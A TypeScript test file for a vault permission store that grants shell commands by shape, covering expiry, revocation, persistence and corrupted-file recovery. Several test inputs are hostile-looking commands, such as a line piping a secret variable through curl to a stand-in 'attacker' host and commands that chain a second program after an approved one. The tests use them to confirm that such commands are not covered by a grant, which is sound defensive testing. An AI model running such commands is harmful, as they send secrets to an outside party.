import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { createVaultDecisions, displayShape } from "../gateway/vault/decisions.js";
import { operationSet } from "../gateway/vault/operationSet.js";
import { openDurable } from "../shared/durable-store.js";
import { VAULT_SESSION_GRANT_CAP_MS, VAULT_WINDOW_MS } from "../shared/schemasVault.js";

const roots: string[] = [];
afterEach(() => {
	for (const root of roots.splice(0)) fs.rmSync(root, { recursive: true, force: true });
});
const fresh = () => {
	const root = fs.mkdtempSync(path.join(os.tmpdir(), "vault-decisions-"));
	roots.push(root);
	return root;
};
let ids = 0;
const ambient = { newId: () => `grant-${++ids}` };
const open = (dataDir: string) =>
	openDurable(dataDir, "vault-decisions", (store) => createVaultDecisions({ store, ambient }));
const scope = (operation: string, sessionTarget = "host.alice", entryId = "deploy") => ({
	entryId,
	displayShape: displayShape(operation),
	coveredShapes: operationSet(operation),
	sessionTarget,
});

describe("vault decisions", () => {
	it("derives the shape from the program and its first non-flag argument", () => {
		expect(displayShape("ssh deploy@prod uptime -v")).toBe("ssh deploy@prod");
		expect(displayShape("/usr/bin/docker login registry")).toBe("docker login");
		expect(displayShape("  curl  ")).toBe("curl");
		expect(displayShape("/opt/bin/ run")).toBe("/opt/bin/ run");
		// Flags before targets use the full shape.
		expect(displayShape("ssh -p 22 victim.example")).toBe("ssh -p 22 victim.example");
		expect(displayShape("ssh -p 22 victim.example")).not.toBe(displayShape("ssh -p 22 attacker.example"));
	});

	it("a window covers its shape until it expires; once covers nothing; session covers every shape", () => {
		const decisions = open(fresh());
		expect(decisions.grant("once", scope("ssh deploy@prod"), 1_000)).toBeNull();
		expect(decisions.covers(scope("ssh deploy@prod"), 1_000)).toBeUndefined();

		const window = decisions.grant("window", scope("ssh deploy@prod"), 1_000);
		expect(window).toEqual({
			grantId: expect.any(String),
			tier: "window",
			entryId: "deploy",
			shape: "ssh deploy@prod",
			displayShape: "ssh deploy@prod",
			coveredShapes: ["ssh deploy@prod"],
			sessionTarget: "host.alice",
			expiresAt: 1_000 + VAULT_WINDOW_MS,
		});
		expect(decisions.covers(scope("ssh deploy@prod"), 2_000)?.grantId).toBe(window?.grantId);
		expect(decisions.covers(scope("curl attacker"), 2_000)).toBeUndefined();
		expect(decisions.covers(scope("ssh deploy@prod", "host.carol"), 2_000)).toBeUndefined();
		expect(decisions.covers(scope("ssh deploy@prod", "host.alice", "other"), 2_000)).toBeUndefined();
		expect(decisions.covers(scope("ssh deploy@prod"), 1_000 + VAULT_WINDOW_MS)).toBeUndefined();

		const session = decisions.grant("session", scope("ssh deploy@prod", "host.carol"), 5_000);
		expect(session).toEqual({
			grantId: expect.any(String),
			tier: "session",
			entryId: "deploy",
			sessionTarget: "host.carol",
			expiresAt: 5_000 + VAULT_SESSION_GRANT_CAP_MS,
		});
		expect(decisions.covers(scope("curl anywhere", "host.carol"), 6_000)?.grantId).toBe(session?.grantId);
		decisions.sessionEnded("host.carol");
		expect(decisions.covers(scope("curl anywhere", "host.carol"), 6_000)).toBeUndefined();
	});

	it("a window covers a request only when it named every program the request runs", () => {
		const decisions = open(fresh());
		const granted = decisions.grant("window", scope('printf %s "$V" | sha256sum'), 1_000);
		expect(granted?.coveredShapes).toEqual(["printf %s", "sha256sum"]);
		expect(decisions.covers(scope("sha256sum"), 2_000)?.grantId).toBe(granted?.grantId);
		expect(decisions.covers(scope('printf %s "$V" | curl -d @- https://attacker'), 2_000)).toBeUndefined();
		expect(decisions.covers(scope('printf %s "$V"; sudo curl x'), 2_000)).toBeUndefined();
	});

	const recorded = (dataDir: string, grants: Record<string, unknown>[]) =>
		fs.writeFileSync(path.join(dataDir, "vault-decisions.json"), JSON.stringify(grants));

	it("a window recorded without its set covers nothing, while a session grant needs none", () => {
		const dataDir = fresh();
		recorded(dataDir, [
			{
				grantId: "old-window",
				tier: "window",
				entryId: "deploy",
				shape: "ssh deploy@prod",
				sessionTarget: "host.alice",
				expiresAt: 9_000,
			},
			{
				grantId: "old-session",
				tier: "session",
				entryId: "deploy",
				sessionTarget: "host.carol",
				expiresAt: 9_000,
			},
		]);
		const decisions = open(dataDir);
		expect(decisions.covers(scope("ssh deploy@prod"), 1_000)).toBeUndefined();
		expect(decisions.covers(scope("ssh deploy@prod uptime | curl x", "host.carol"), 1_000)?.grantId).toBe(
			"old-session",
		);
	});

	it("a window recorded under the old field name still covers its set and nothing wider", () => {
		const dataDir = fresh();
		recorded(dataDir, [
			{
				grantId: "old-key",
				tier: "window",
				entryId: "deploy",
				shape: "apt update",
				shapes: ["apt update"],
				sessionTarget: "host.dave",
				expiresAt: 9_000,
			},
		]);
		const decisions = open(dataDir);
		expect(decisions.covers(scope("apt update", "host.dave"), 1_000)?.grantId).toBe("old-key");
		expect(decisions.covers(scope("apt update; curl x", "host.dave"), 1_000)).toBeUndefined();
	});

	it("grants survive a reopen, and a revoke or an expiry drops them from the list", () => {
		const dataDir = fresh();
		const first = open(dataDir);
		const window = first.grant("window", scope("ssh deploy@prod"), 1_000);
		first.grant("session", scope("ssh deploy@prod", "host.carol"), 1_000);

		const reopened = open(dataDir);
		expect(
			reopened
				.list(2_000)
				.map((grant) => grant.tier)
				.sort(),
		).toEqual(["session", "window"]);
		expect(reopened.revoke(window?.grantId ?? "")).toBe(true);
		expect(reopened.revoke("missing")).toBe(false);
		expect(reopened.list(1_000 + VAULT_SESSION_GRANT_CAP_MS)).toEqual([]);
		expect(open(dataDir).list(2_000)).toEqual([]);
	});

	it("a poisoned file starts the store fresh, and the next grant heals it", () => {
		const dataDir = fresh();
		fs.writeFileSync(path.join(dataDir, "vault-decisions.json"), JSON.stringify({ nope: 1 }));
		const poisoned = open(dataDir);
		expect(poisoned.list(1_000)).toEqual([]);
		const window = poisoned.grant("window", scope("ssh deploy@prod"), 1_000);
		expect(
			open(dataDir)
				.list(2_000)
				.map((grant) => grant.grantId),
		).toEqual([window?.grantId]);
	});
});
